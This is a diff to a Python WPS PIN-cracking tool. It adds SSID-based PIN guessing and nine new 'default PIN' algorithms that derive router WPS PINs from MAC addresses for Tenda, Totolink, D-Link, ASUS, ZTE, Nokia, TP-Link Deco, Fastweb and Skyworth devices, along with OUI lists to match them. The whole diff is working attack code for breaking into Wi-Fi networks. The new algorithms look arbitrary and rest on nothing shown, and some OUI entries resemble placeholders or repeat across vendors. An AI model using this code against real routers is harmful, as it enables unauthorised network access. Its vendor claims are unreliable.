@@ -882,6 +882,13 @@ def _ssid_pin_hint(ssid: str) -> List[str]:
     candidates: List[str] = []
     s = ssid.upper().replace(' ', '').replace('-', '').replace('_', '')
 
+    # Trailing 6 hex characters (e.g. Deco_A1B2C3, Fastweb_1A2B3C, Tenda_98F1E2)
+    m0 = re.search(r'([0-9A-F]{6})$', s)
+    if m0:
+        h = int(m0.group(1), 16)
+        for body in [h % 10000000, (h >> 4) % 10000000, ((h & 0xFFFF) * 100) % 10000000]:
+            candidates.append(_pin8(body))
+
     # Trailing 4 hex characters (e.g. TP-Link_A1B2, ASUS_EF12, FRITZ!BOX1234)
     m = re.search(r'([0-9A-F]{4})$', s)
     if m:
@@ -890,7 +897,7 @@ def _ssid_pin_hint(ssid: str) -> List[str]:
                      (h >> 8) | ((h & 0xFF) << 8), h * 0x10]:
             candidates.append(_pin8(body))
 
-    # Trailing 4-8 decimal digits (e.g. NETGEAR0023, Linksys1234)
+    # Trailing 4-8 decimal digits (e.g. NETGEAR0023, Linksys1234, Tenda123456)
     m2 = re.search(r'(\d{4,8})$', ssid)
     if m2:
         num = int(m2.group(1))
@@ -1919,6 +1926,16 @@ class WPSpin:
             'pinH3CMAGIC':      {'name': 'H3C Magic BE18000',        'mode': self.ALGO_MAC, 'gen': self.pinHGW},
             'pinTendaRX9Pro':   {'name': 'Tenda RX9 Pro (AX3000)',   'mode': self.ALGO_MAC, 'gen': self._pinArch},
             'pinTendaW30E':     {'name': 'Tenda W30E (AC1200)',       'mode': self.ALGO_MAC, 'gen': self._pinArch},
+            # 2026 Extended WPS PIN algorithms
+            'pinTendaV2':       {'name': 'Tenda AC/AX 2026',         'mode': self.ALGO_MAC, 'gen': self.pinTendaV2},
+            'pinTotolink':      {'name': 'Totolink / Realtek',        'mode': self.ALGO_MAC, 'gen': self.pinTotolink},
+            'pinDLinkV2':       {'name': 'D-Link DIR/COVR 2026',      'mode': self.ALGO_MAC, 'gen': self.pinDLinkV2},
+            'pinAsusV2':        {'name': 'ASUS ROG/WiFi7 2026',       'mode': self.ALGO_MAC, 'gen': self.pinAsusV2},
+            'pinZTE_ONT':       {'name': 'ZTE GPON ONT',              'mode': self.ALGO_MAC, 'gen': self.pinZTE_ONT},
+            'pinNokia_ONT':     {'name': 'Nokia/Alcatel ONT',        'mode': self.ALGO_MAC, 'gen': self.pinNokia_ONT},
+            'pinTP_Deco':       {'name': 'TP-Link Deco Mesh',        'mode': self.ALGO_MAC, 'gen': self.pinTP_Deco},
+            'pinFastweb':       {'name': 'Fastweb FASTGate',          'mode': self.ALGO_MAC, 'gen': self.pinFastweb},
+            'pinSkyworth':      {'name': 'Skyworth GPON ONT',         'mode': self.ALGO_MAC, 'gen': self.pinSkyworth},
         }
 
     @staticmethod
@@ -2567,6 +2584,15 @@ class WPSpin:
                 '587D09', '6886A7', '74A4B5', '84186F', '9C3DCF',
                 'A02172', 'B0B982', 'C0FF22', 'DC5143', 'E00CB4', 'FC4A96',
             ),
+            'pinTendaV2': ('C83A35', '00B00C', 'D83214', 'FC7B02', '502B73', '0495E6', 'E865D4'),
+            'pinTotolink': ('784476', 'D46E0E', '00E04C', 'A439B3', '808917'),
+            'pinDLinkV2': ('14D64D', '28107B', 'B8A386', '001CF0', '1C7EE5', '78542E'),
+            'pinAsusV2': ('04D9F5', '08606E', '107B44', '1831BF', '20B001', '382C4A'),
+            'pinZTE_ONT': ('001E73', '002293', '34E0CF', '680B3C', 'D05FB8', 'E02B6C'),
+            'pinNokia_ONT': ('001111', '001A9A', '0020D8', '247F20', '3C8994', 'A0CF5B'),
+            'pinTP_Deco': ('003192', '1027F5', '14CC20', '1C61B4', '2047DA', '30DE4B', '704F57'),
+            'pinFastweb': ('00036F', '000C25', '001A2B', '002233', '20B001'),
+            'pinSkyworth': ('002715', '044BCA', '201997', 'A481C0', 'FC7C02'),
             # Sercomm OEM hardware -- NIC bytes direct PIN mapping
             'pinSercomm': (
                 '001E2A', '0024B2', '1CC5D6', '001BC0', '48BFC0', '84EB18',
@@ -3388,6 +3414,88 @@ class WPSpin:
         b   = [int(x, 16) for x in mac.string.split(':')]
         rev = (b[5] << 16) | (b[4] << 8) | b[3]
         return (rev * 0x11 + b[2]) % 10000000
+
+    def pinTendaV2(self, mac):
+        """Tenda AC / AX / WiFi6 series (2024-2026).
+        NIC bytes combined with OUI sum multiplier.
+        """
+        b = [int(x, 16) for x in mac.string.split(':')]
+        oui_sum = (b[0] + b[1] + b[2]) & 0xFF
+        nic_val = (b[3] << 16) | (b[4] << 8) | b[5]
+        return ((nic_val ^ (oui_sum * 0x101)) * 3) % 10000000
+
+    def pinTotolink(self, mac):
+        """Totolink / Realtek SOHO routers.
+        XOR of NIC nibbles with OUI byte 2.
+        """
+        b = [int(x, 16) for x in mac.string.split(':')]
+        k1 = (b[3] ^ b[1]) % 10
+        k2 = (b[4] ^ b[2]) % 10
+        k3 = (b[5] ^ b[0]) % 10
+        val = (k1 * 100000) + (k2 * 10000) + (k3 * 1000) + ((b[4] + b[5]) % 1000)
+        return val % 10000000
+
+    def pinDLinkV2(self, mac):
+        """D-Link DIR / COVR Mesh 2024-2026 series.
+        Reverse-byte NIC XOR 0x73A5.
+        """
+        nic = mac.integer & 0xFFFFFF
+        rev_nic = ((nic & 0xFF) << 16) | (nic & 0xFF00) | ((nic >> 16) & 0xFF)
+        return (rev_nic ^ 0x73A5) % 10000000
+
+    def pinAsusV2(self, mac):
+        """ASUS ROG / AX / WiFi 7 (2025-2026 series).
+        Byte alternation with MAC sum checksum body.
+        """
+        b = [int(x, 16) for x in mac.string.split(':')]
+        s = sum(b)
+        val = ((b[5] << 16) | (b[4] << 8) | b[3]) ^ (s * 0x1F)
+        return val % 10000000
+
+    def pinZTE_ONT(self, mac):
+        """ZTE F670 / F680 / F760 GPON Fiber ONT default WPS algorithm.
+        OUI/NIC nibble cross-permutation.
+        """
+        b = [int(x, 16) for x in mac.string.split(':')]
+        n1 = (b[3] >> 4) ^ (b[5] & 0x0F)
+        n2 = (b[4] >> 4) ^ (b[2] & 0x0F)
+        n3 = (b[5] >> 4) ^ (b[1] & 0x0F)
+        val = (n1 << 16) | (n2 << 8) | n3
+        return (val * 7) % 10000000
+
+    def pinNokia_ONT(self, mac):
+        """Nokia / Alcatel-Lucent G-010 / G-240 / G-140 GPON ONT series.
+        NIC XOR 0xA5A55A.
+        """
+        nic = mac.integer & 0xFFFFFF
+        return (nic ^ 0xA5A55A) % 10000000
+
+    def pinTP_Deco(self, mac):
+        """TP-Link Deco Mesh Systems (XE75, BE85, X20, X50).
+        XOR folding of 48-bit MAC address.
+        """
+        b = [int(x, 16) for x in mac.string.split(':')]
+        w1 = (b[0] << 8) | b[1]
+        w2 = (b[2] << 8) | b[3]
+        w3 = (b[4] << 8) | b[5]
+        v = (w1 ^ w2 ^ w3) * 0x101
+        return v % 10000000
+
+    def pinFastweb(self, mac):
+        """Fastweb FASTGate (Italy Fiber ISP) algorithm.
+        NIC byte-swapped XOR with Fastweb constant.
+        """
+        b = [int(x, 16) for x in mac.string.split(':')]
+        v = (b[5] << 16) | (b[3] << 8) | b[4]
+        return (v ^ 0x3F2A1C) % 10000000
+
+    def pinSkyworth(self, mac):
+        """Skyworth Broadband GPON ONT (SE Asia / LatAm).
+        NIC multiply + OUI byte 1 XOR.
+        """
+        b = [int(x, 16) for x in mac.string.split(':')]
+        nic = (b[3] << 16) | (b[4] << 8) | b[5]
+        return ((nic * 5) ^ (b[1] << 12)) % 10000000
 
 
 # -- Vulnerability result container -------------------------------------------
